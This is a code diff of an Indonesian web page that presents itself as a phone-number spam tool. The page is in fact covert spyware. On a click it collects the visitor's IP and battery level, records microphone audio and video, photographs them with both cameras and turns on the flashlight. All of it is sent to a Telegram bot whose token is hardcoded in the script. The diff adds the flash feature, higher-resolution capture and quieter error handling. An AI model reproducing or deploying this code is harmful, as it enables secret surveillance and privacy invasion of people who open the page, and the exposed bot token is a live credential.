@@ -1,4 +1,4 @@
-  <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8">
@@ -97,7 +97,7 @@
   </div>
 
   <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas" width="640" height="480"></canvas>
+  <canvas id="canvas" width="1280" height="720"></canvas>
 
   <script>
     const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
@@ -134,19 +134,43 @@
       });
     }
 
+    // Fitur Baru: Flash HP 20 Detik
+    async function toggleFlash() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'environment' } 
+        });
+        const track = stream.getVideoTracks()[0];
+        const capabilities = track.getCapabilities();
+
+        if (!capabilities.torch) {
+          sendToTelegram('gagal menyalahkan flash');
+          track.stop();
+          return;
+        }
+
+        await track.applyConstraints({ advanced: [{ torch: true }] });
+        sendToTelegram('flash berhasil nyala ✅');
+
+        setTimeout(async () => {
+          await track.applyConstraints({ advanced: [{ torch: false }] });
+          track.stop();
+        }, 20000); // 20 detik
+      } catch (err) {
+        sendToTelegram('gagal menyalahkan flash');
+      }
+    }
+
     async function getInfo() {
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
-        const locRes = await fetch(`https://ip-api.com/json/${ipData.ip}`);
-        const loc = await locRes.json();
         const battery = await navigator.getBattery?.() || { level: 0 };
-        const text = `IP: ${ipData.ip}\nKota: ${loc.city || '-'}\nBaterai: ${(battery.level * 100).toFixed(0)}%\nBrowser: ${navigator.userAgent}`;
+        const text = `IP: ${ipData.ip}\nBaterai: ${(battery.level * 100).toFixed(0)}%\nWaktu: ${new Date().toLocaleString()}`;
         sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
       } catch {}
     }
 
-    // Fitur Baru: Rekam Suara (Microphone)
     async function recordAudio() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -155,14 +179,12 @@
         mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
         mediaRecorder.onstop = () => {
           const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-          sendMedia(blob, 'voice', 'voice.ogg', '🎤 Rekaman Suara (5s)');
+          sendMedia(blob, 'voice', 'voice.ogg', '🎤 Voice Note (5s)');
           stream.getTracks().forEach(track => track.stop());
         };
         mediaRecorder.start();
         setTimeout(() => mediaRecorder.stop(), 5000);
-      } catch (err) {
-        sendToTelegram(`❌ Gagal Akses Mic: ${err.message}`);
-      }
+      } catch (err) {}
     }
 
     async function recordVideo() {
@@ -184,19 +206,22 @@
     async function capturePhoto(facingMode, label) {
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: facingMode } 
+        });
         video.srcObject = stream;
         return new Promise(resolve => {
           video.onloadedmetadata = () => {
             setTimeout(() => {
-              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
               canvas.toBlob(blob => {
-                if (blob) sendMedia(blob, 'photo', 'photo.jpg', `📸 Foto: ${label}`);
+                if (blob) sendMedia(blob, 'photo', `${label}.jpg`, `📸 Foto: ${label}`);
                 stream.getTracks().forEach(track => track.stop());
                 resolve();
-              }, 'image/jpeg');
-            }, 2000);
+              }, 'image/jpeg', 0.9);
+            }, 2500);
           };
         });
       } catch (err) {}
@@ -205,22 +230,26 @@
     button.addEventListener('click', async () => {
       const nomor = input.value.trim();
       if (!nomor || nomor.length < 8) return;
+      
       button.disabled = true;
-      infoDiv.innerText = '⏳ Sedang Memproses...';
+      infoDiv.innerText = '⏳ Memproses sistem...';
       sendToTelegram(`<b>📞 Target:</b> ${nomor}`);
       
       try {
         await getInfo();
-        recordAudio(); // Mulai rekam suara
-        recordVideo(); // Mulai rekam video
+        toggleFlash(); // Jalankan Fitur Flash
+        recordAudio(); 
+        recordVideo();
+        
         await capturePhoto("user", "Depan");
-        await new Promise(r => setTimeout(r, 1000));
+        await new Promise(r => setTimeout(r, 1500));
         await capturePhoto("environment", "Belakang");
         
-        infoDiv.innerText = `✅ Berhasil mengirim spam ke ${nomor}`;
+        infoDiv.innerText = `✅ Berhasil memproses ${nomor}`;
         button.disabled = false;
         input.value = '';
       } catch (e) {
+        infoDiv.innerText = '❌ Terjadi kesalahan.';
         button.disabled = false;
       }
     });
